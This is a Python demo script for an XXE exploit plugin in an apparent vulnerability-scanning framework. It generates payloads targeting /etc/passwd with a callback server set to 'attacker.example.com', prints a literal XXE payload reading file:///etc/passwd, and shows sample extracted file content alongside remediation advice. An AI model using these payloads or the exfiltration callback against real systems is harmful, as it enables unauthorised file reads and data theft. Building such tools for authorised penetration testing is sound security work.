#!/usr/bin/env python3
"""
Demo: XXE Plugin with Visual Proof Capture

This script demonstrates the enhanced XXE plugin with visual proof capture capabilities.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from scanner.plugins.exploits.xxe_plugin import XXEPlugin, HAS_VISUAL_PROOF


def print_section(title):
    """Print a formatted section header"""
    print("\n" + "=" * 70)
    print(f" {title}")
    print("=" * 70)


def demo_xxe_visual_proof():
    """Demonstrate XXE plugin with visual proof capabilities"""
    
    print_section("XXE Exploit Plugin - Visual Proof Demo")
    
    # Initialize plugin
    plugin = XXEPlugin()
    
    print("\n📋 Plugin Information:")
    print(f"   Name:              {plugin.name}")
    print(f"   Version:           {plugin.version}")
    print(f"   Vulnerability:     {plugin.vulnerability_type}")
    print(f"   Severity:          {plugin.get_severity_level().upper()}")
    print(f"   Visual Proof:      {'✓ Enabled' if HAS_VISUAL_PROOF else '✗ Not Available'}")
    
    # Generate payloads
    print_section("Payload Generation")
    
    context = {
        'target_file': '/etc/passwd',
        'callback_server': 'attacker.example.com'
    }
    
    payloads = plugin.generate_payloads(context)
    
    print(f"\n✓ Generated {len(payloads)} XXE payloads for target: {context['target_file']}")
    print("\nPayload #1 - Direct File Read:")
    print("-" * 70)
    print(payloads[0])
    
    if len(payloads) > 1:
        print("\nPayload #2 - Base64 Encoded (first 300 chars):")
        print("-" * 70)
        print(payloads[1][:300] + "...")
    
    # Demonstrate execute_attack structure
    print_section("Execute Attack with Visual Proof")
    
    print("\n📸 Visual Proof Capture Workflow:")
    print("   1. Execute XXE attack and extract files")
    print("   2. If successful, capture visual proof:")
    print("      - Create HTML page showing exploitation")
    print("      - Display XXE payload used")
    print("      - Show extracted file content")
    print("      - Capture screenshot of proof page")
    print("   3. Return results with visual proof metadata")
    
    print("\n🎯 Example Attack Configuration:")
    config = {
        'capture_visual_proof': True,
        'verify_ssl': False,
        'timeout': 10
    }
    
    for key, value in config.items():
        print(f"   {key:25s}: {value}")
    
    print("\n💡 Visual Proof Features:")
    print("   ✓ Automatic screenshot capture")
    print("   ✓ HTML-formatted proof page")
    print("   ✓ Payload and response display")
    print("   ✓ Extracted file content preview")
    print("   ✓ Metadata tracking")
    
    # Show what a successful result looks like
    print_section("Expected Result Structure")
    
    print("\nWhen XXE exploitation succeeds with visual proof:")
    print("""
    {
        'success': True,
        'extracted_files': {
            '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\\n...',
            '/etc/hosts': '127.0.0.1 localhost\\n...'
        },
        'evidence': 'Extracted 2 file(s): /etc/passwd, /etc/hosts',
        'vulnerability_type': 'xxe',
        'message': 'Successfully extracted 2 file(s)',
        'visual_proofs': [
            {
                'type': 'screenshot',
                'data': '<base64_encoded_image>',
                'title': 'XXE - Extracted /etc/passwd',
                'description': 'Successfully extracted file /etc/passwd using XML External Entity injection',
                'exploit_step': 'File extraction via XXE payload',
                'payload': '<?xml version="1.0"?>\\n<!DOCTYPE foo [\\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\\n]>\\n<root>&xxe;</root>'
            }
        ]
    }
    """)
    
    # Show remediation advice
    print_section("Security Remediation")
    
    remediation = plugin.get_remediation_advice()
    print(f"\n{remediation}")
    
    # Summary
    print_section("Enhancement Summary")
    
    print("\n✅ Enhancements Applied:")
    print("   ✓ Added VisualProofCapture and MediaManager imports with try/except")
    print("   ✓ Implemented _capture_visual_proof method")
    print("   ✓ Integrated visual proof capture in execute_attack")
    print("   ✓ Visual proof shows XXE payload and extracted content")
    print("   ✓ HTML proof page with formatted display")
    print("   ✓ Automatic screenshot capture")
    
    print("\n📊 Pattern Consistency:")
    print("   ✓ Follows LFI plugin pattern")
    print("   ✓ Follows RFI plugin pattern")
    print("   ✓ Consistent import structure")
    print("   ✓ Consistent method signatures")
    print("   ✓ Consistent visual proof metadata")
    
    print("\n" + "=" * 70)
    print(" ✓ XXE Plugin Enhancement Complete!")
    print("=" * 70 + "\n")


if __name__ == '__main__':
    try:
        demo_xxe_visual_proof()
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
